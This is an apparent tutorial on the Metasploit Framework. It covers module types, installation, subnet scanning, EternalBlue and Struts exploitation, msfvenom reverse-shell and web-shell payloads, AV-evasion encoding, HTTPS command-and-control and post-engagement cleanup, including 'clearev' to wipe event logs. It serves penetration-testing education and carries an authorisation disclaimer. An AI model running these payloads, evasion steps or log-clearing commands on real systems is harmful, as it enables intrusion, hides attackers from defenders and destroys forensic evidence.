What is the Metasploit Framework?

The Metasploit Framework (MSF) is the world's most widely used open-source penetration testing platform, maintained by Rapid7. First released by HD Moore in 2003 and acquired by Rapid7 in 2009, it has grown from a simple exploit collection into a full-featured offensive security platform with over 2,300 exploit modules, 1,000+ auxiliary modules, and hundreds of post-exploitation capabilities.

What makes Metasploit uniquely powerful is its modularity — every component is interchangeable. The same framework that runs a known CVE exploit against a Windows server can fuzz a network protocol, generate a custom payload for a specific architecture, bypass antivirus, and maintain persistent access across reboots — all within a single, unified console. For a penetration tester, mastering Metasploit is not optional; it is foundational.

Authorised Use Only. Metasploit is a professional penetration testing tool. All techniques in this guide must be performed exclusively in authorised environments — your own lab, a CTF platform, or under explicit written permission from the target system owner. Unauthorised use is a criminal offence.

Core Capabilities

Metasploit spans the entire penetration testing lifecycle — it is not just an exploit launcher. Its capability set covers network discovery and service enumeration (via auxiliary scanner modules), known CVE exploitation (2,300+ exploit modules covering Windows, Linux, web apps, databases, and network devices), payload generation and delivery, Meterpreter-based post-exploitation, privilege escalation, persistence mechanisms, credential harvesting, and AV/EDR evasion. It integrates natively with Nmap, Nessus, OpenVAS, and Burp Suite for a full-stack assessment workflow.

Framework Architecture & Module Types

Metasploit's power comes from its modular architecture. Every piece of functionality — from a network scanner to a privilege escalation technique — is encapsulated as a discrete module with standardised inputs and outputs. Understanding which module type to reach for in a given situation is what separates an effective MSF operator from someone who just knows a few commands.

01
Exploits
Code that takes advantage of a specific vulnerability in a target system. Each exploit module targets a specific CVE or vulnerability class in a specific software version. Paired with a payload to deliver the attack and establish access. Over 2,300 exploits covering Windows, Linux, macOS, network devices, web frameworks, and databases.
ATTACK
02
Payloads
Code executed on the target system after a successful exploit. Singles (self-contained), Stagers (establish a channel then download the Stage), and Stages (the actual capability: Meterpreter, shell, VNC). Meterpreter is the most powerful — an in-memory agent with no files on disk, providing a rich API for post-exploitation.
DELIVERY
03
Auxiliary Modules
Non-exploitation modules covering scanning, enumeration, fuzzing, brute-force, spoofing, and protocol analysis. Used for reconnaissance and vulnerability identification before launching exploits. Hundreds of modules covering SMB, SSH, HTTP, FTP, SNMP, LDAP, databases, and wireless protocols.
RECON
04
Post Modules
Executed after initial access is established. Provide capabilities for privilege escalation, persistence, credential harvesting, lateral movement, data exfiltration, and situational awareness. Run against an established Meterpreter session rather than directly against a target — operate entirely within the attacker's established access context.
POST-EXPLOIT
05
Encoders
Transform payload byte sequences to avoid signature-based detection by antivirus engines. The most well-known is Shikata Ga Nai (x86/sgn) — a polymorphic XOR additive feedback encoder that produces a different output on each generation. Modern EDR solutions are largely immune to encoding alone; encoding must be combined with other evasion techniques.
EVASION
06
NOPs & Evasion
NOP (No-Operation) sleds pad shellcode to increase exploit reliability by giving the instruction pointer a larger landing zone. Dedicated evasion modules generate payloads specifically designed to bypass modern endpoint detection and response (EDR) products through techniques beyond simple encoding.

Installation & Core Command Reference

Metasploit comes pre-installed on Kali Linux and Parrot OS — the fastest path to a working environment. For custom builds, the official installer script handles all dependencies on Debian/Ubuntu-based systems. The framework is database-driven (PostgreSQL) for storing hosts, services, vulnerabilities, credentials, and loot — always start the database before launching msfconsole for a fully functional workspace.

# On Kali Linux — Metasploit is pre-installed, just update it sudo apt update && sudo apt install metasploit-framework # Manual install on Ubuntu/Debian via Rapid7's official installer curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \ > msfinstall && chmod 755 msfinstall && ./msfinstall # Start PostgreSQL database (required for full workspace functionality) sudo systemctl start postgresql sudo msfdb init # Initialise the MSF database sudo msfdb status # Verify database is connected # Launch the Metasploit console msfconsole # Keep framework up to date msfupdate # Or: apt upgrade metasploit-framework

Reconnaissance & Scanning with MSF

Metasploit's auxiliary scanner modules provide comprehensive network reconnaissance capabilities — directly integrated with the MSF database so discovered hosts, services, and vulnerabilities are automatically stored and available for exploit module targeting. The db_nmap command is the fastest path to populating the database: it runs a standard Nmap scan and imports all results automatically, making discovered hosts immediately targetable by exploit modules via RHOSTS.

auxiliary/scanner/portscan/tcp
Port Scanner
Multi-threaded TCP port scanner — faster than Nmap for large subnet sweeps when imported results are not required
auxiliary/scanner/smb/smb_ms17_010
Vuln Scanner
Checks targets for the EternalBlue SMB vulnerability (MS17-010) without attempting exploitation — safe pre-check
auxiliary/scanner/ssh/ssh_version
Service ID
Fingerprints SSH service versions across a subnet — identifies outdated OpenSSH versions with known CVEs
auxiliary/scanner/http/http_version
Web Recon
Identifies web server type and version across multiple targets — useful for mapping the web attack surface
auxiliary/scanner/ftp/anonymous
Auth Check
Tests for anonymous FTP access — a common misconfiguration that exposes sensitive files without credentials
auxiliary/scanner/snmp/snmp_enum
Enumeration
Extracts system information, network interfaces, running processes, and open ports via SNMP community strings
# Create a dedicated workspace for this engagement workspace -a client_engagement_2024 # db_nmap: runs Nmap AND imports results into MSF database automatically db_nmap -sV -sC -O --open -p- 192.168.1.0/24 # Query discovered hosts and services from database hosts # List all discovered hosts services # List all discovered services services -p 445 # Filter: hosts with port 445 open (SMB) services -p 80,443 -R # Set RHOSTS to all hosts with web services # Use MSF TCP port scanner across a subnet use auxiliary/scanner/portscan/tcp set RHOSTS 192.168.1.0/24 set PORTS 22,80,443,445,3389,8080 set THREADS 50 run # Check entire subnet for EternalBlue vulnerability (safe — no exploitation) use auxiliary/scanner/smb/smb_ms17_010 set RHOSTS 192.168.1.0/24 set THREADS 20 run

Exploitation Workflows

Metasploit's exploitation workflow follows a consistent pattern regardless of the target or vulnerability: search for the right module, select it, configure RHOSTS/LHOST/LPORT, select a compatible payload, optionally run the check command, then execute. The discipline lies in understanding which exploits apply to which service versions, which payloads are appropriate for the target OS and architecture, and how to handle failures gracefully without impacting production systems.

⟩ EternalBlue — MS17-010 SMB Exploitation
EternalBlue (CVE-2017-0144) is a vulnerability in Microsoft's SMBv1 protocol originally developed by the NSA and leaked by the Shadow Brokers in 2017. It allows remote code execution on unpatched Windows systems without authentication — one of the most impactful vulnerabilities in Microsoft's history, responsible for both the WannaCry and NotPetya attacks. The MSF module provides a reliable, weaponised implementation against Windows 7 through Server 2008 R2.
# Step 1: Search for the EternalBlue exploit module search ms17_010 # Step 2: Select the EternalBlue exploit use exploit/windows/smb/ms17_010_eternalblue # Step 3: Review required options show options # Step 4: Set the target IP address set RHOSTS 192.168.1.5 # Step 5: Select a Meterpreter payload (reverse TCP — target calls back to us) set PAYLOAD windows/x64/meterpreter/reverse_tcp # Step 6: Set attacker IP and listening port set LHOST 192.168.1.100 set LPORT 4444 # Step 7 (Optional): Verify target is vulnerable without exploiting check # Step 8: Launch the exploit exploit # Success output: # [*] Started reverse TCP handler on 192.168.1.100:4444 # [+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= # [+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-= # [*] Meterpreter session 1 opened
⟩ Web Application Exploitation
Metasploit covers a wide range of web application vulnerabilities — from Apache Struts (CVE-2017-5638, used in the Equifax breach) to PHP file upload vulnerabilities, WordPress plugin exploits, and Tomcat manager authentication bypass. Web application exploits typically require additional options like TARGETURI, VHOST, and web-specific SSL settings. Always use info to understand what each module requires before running it.
# Search for the Struts exploit search CVE-2017-5638 # Select the Struts 2 REST plugin RCE module use exploit/multi/http/struts2_content_type_ognl # Review full module info including required options and targets info # Configure target set RHOSTS target.example.com set RPORT 8080 set TARGETURI /struts2-showcase/index.action set SSL false # Select a Linux payload (Struts usually runs on Linux/Java) set PAYLOAD linux/x64/meterpreter/reverse_tcp set LHOST 192.168.1.100 set LPORT 4444 # Run exploit exploit
⟩ Multi-Handler — Catching Reverse Shells
When a payload is delivered via a method outside of Metasploit (email attachment, USB drop, web download), the exploit/multi/handler module acts as the receiving end. It listens for the incoming connection from the payload, establishes the Meterpreter session, and integrates it fully with the MSF workspace. Always run multi/handler as a background job (exploit -j) to keep msfconsole interactive while waiting for callbacks.
# Set up a listener to catch reverse shell / Meterpreter callbacks use exploit/multi/handler # Must match exactly the payload you generated with msfvenom set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 192.168.1.100 # Your IP — target will connect back to this set LPORT 4444 # Run as a background job — keeps console interactive exploit -j # Once a target executes the payload, session appears: # [*] Meterpreter session 1 opened (192.168.1.100:4444 → 192.168.1.50:55234) # List and interact with sessions sessions -l sessions -i 1 # Interact with session 1 # Upgrade a basic shell session to Meterpreter sessions -u 1

Meterpreter & Post-Exploitation

Meterpreter is Metasploit's flagship post-exploitation agent — a reflective DLL injected directly into memory without writing any files to disk, making it significantly harder to detect than file-based agents. It provides an extensible, encrypted communication channel with capabilities spanning the entire post-exploitation kill chain: privilege escalation, credential harvesting, keylogging, screenshot capture, filesystem access, pivoting, and persistence — all controllable from a single interactive session.

[ i ]

Meterpreter communicates over an encrypted TLS channel by default and operates entirely in memory — leaving no executable on disk. This makes it substantially harder to detect via filesystem scanning compared to traditional backdoors, though modern EDR solutions detect it via behavioural analysis of the injection pattern.

msfvenom — Custom Payload Generation

msfvenom is Metasploit's standalone payload generator and encoder — the replacement for the legacy msfpayload and msfencode tools. It generates standalone payload executables, shellcode in numerous formats, and language-specific shellcode arrays for embedding in custom exploits. The generated payload must always be paired with a matching multi/handler listener using the same payload type, LHOST, and LPORT values.

# List all available payloads msfvenom -l payloads # Windows — 64-bit Meterpreter reverse TCP executable msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -f exe -o payload_win.exe # Linux — 64-bit Meterpreter reverse TCP ELF binary msfvenom -p linux/x64/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -f elf -o payload_linux.elf # macOS — reverse shell payload msfvenom -p osx/x64/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -f macho -o payload_macos # Android — APK with embedded reverse shell msfvenom -p android/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -f apk -o payload.apk # PowerShell payload — for script-based delivery (Windows) msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -f psh -o payload.ps1 # Raw shellcode — embed in a custom exploit (C array format) msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -f c # Output as C byte array
# PHP web shell — for web server compromise (upload via file upload vulnerability) msfvenom -p php/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -f raw -o shell.php # JSP web shell — Java application servers (Tomcat, JBoss) msfvenom -p java/jsp_shell_reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -f raw -o shell.jsp # ASP.NET web shell — IIS servers msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -f aspx -o shell.aspx # Python payload — cross-platform delivery via Python interpreter msfvenom -p cmd/unix/reverse_python \ LHOST=192.168.1.100 LPORT=4444 \ -f raw -o shell.py

AV Evasion & Best Practices

Raw Meterpreter payloads are immediately detected by all major antivirus and EDR solutions — their signatures have been known for over a decade. In modern penetration testing engagements, AV/EDR evasion is not optional; it is a mandatory component of realistic attack simulation. The techniques below range from simple encoding (lowest efficacy against modern defences) through HTTPS payloads, custom shellcode loaders, and process injection — each representing a more sophisticated evasion layer.

⟩ Encoding with Shikata Ga Nai
The x86/shikata_ga_nai (SGN) encoder is a polymorphic XOR additive feedback encoder — it produces different output bytes on every generation while maintaining the same decoded shellcode at runtime. Multiple encoding iterations increase the unique byte sequence, but modern AV solutions detect the decoder stub pattern regardless of iteration count. Encoding alone is insufficient against any modern endpoint security product — it should always be combined with additional techniques.
# Single encoding pass — minimal evasion msfvenom -p windows/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -e x86/shikata_ga_nai \ -f exe -o encoded_single.exe # Multiple encoding iterations — each pass re-encodes the output # More iterations = more unique bytes, but same detection rate vs modern AV msfvenom -p windows/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -e x86/shikata_ga_nai -i 10 \ -f exe -o encoded_x10.exe # Chain multiple encoders — apply different encoders sequentially msfvenom -p windows/meterpreter/reverse_tcp \ LHOST=192.168.1.100 LPORT=4444 \ -e x86/shikata_ga_nai -e x86/countdown -e x86/alpha_mixed \ -f exe -o multi_encoded.exe
⟩ HTTPS Payloads — Encrypted C2 Communication
Switching from reverse_tcp to reverse_https encrypts all command-and-control traffic in standard TLS, making it indistinguishable from regular HTTPS web traffic to network monitoring tools. The payload blends into normal web browsing traffic, bypasses many network-level detection systems, and operates comfortably through corporate proxies and firewalls that permit outbound HTTPS on port 443.
# Generate HTTPS reverse shell — C2 traffic encrypted in TLS msfvenom -p windows/x64/meterpreter/reverse_https \ LHOST=192.168.1.100 LPORT=443 \ -f exe -o https_payload.exe # Configure multi/handler to receive HTTPS callbacks use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_https set LHOST 192.168.1.100 set LPORT 443 exploit -j # Use a legitimate-looking domain for C2 (domain fronting concept) # Further blend traffic by setting LURI to a believable path set LURI /api/v2/update
Best Practices & Operational Security
  • Always obtain written authorisation — confirm scope, target IP ranges, permitted techniques, and escalation procedures in writing before any engagement
  • Keep Metasploit updated — run msfupdate or apt upgrade metasploit-framework before every engagement to ensure you have the latest exploit modules and bug fixes
  • Use workspaces — create a dedicated MSF workspace per engagement with workspace -a client_name to prevent data contamination between engagements
  • Route through VPN or lab network — never run Metasploit modules directly from your personal internet connection; use a dedicated VPS or VPN endpoint to separate your identity from engagement activity
  • Clean up after testing — kill all sessions, remove persistence mechanisms, delete uploaded payloads, and clear the database loot directory after completing the engagement
  • Combine tools strategically — Metasploit is most powerful when used alongside Nmap (service discovery), Nikto (web scanning), Burp Suite (web application testing), and BloodHound (AD attack path mapping)
  • Document every action — log all commands executed, session IDs, timestamps, and output for the final penetration test report. Use MSF's built-in logging with spool /path/to/logfile
  • Prioritise lab practice — build a home lab with intentionally vulnerable VMs (Metasploitable2/3, HackTheBox, TryHackMe, VulnHub) and practise every workflow before using it in a client engagement
# In Meterpreter — clean up before disconnecting clearev # Clear Windows Application, System, Security event logs cd %TEMP% && rm -rf payload* # Remove uploaded payload files # In msfconsole — session and workspace cleanup sessions -K # Kill ALL active sessions jobs -K # Kill ALL background jobs (handlers) # Remove local MSF loot, stored credentials, and logs rm -rf ~/.msf4/loot/* rm -rf ~/.msf4/logs/* # Enable console logging for the engagement (run at start, not end) spool /opt/engagements/client_2024/msf_session.log
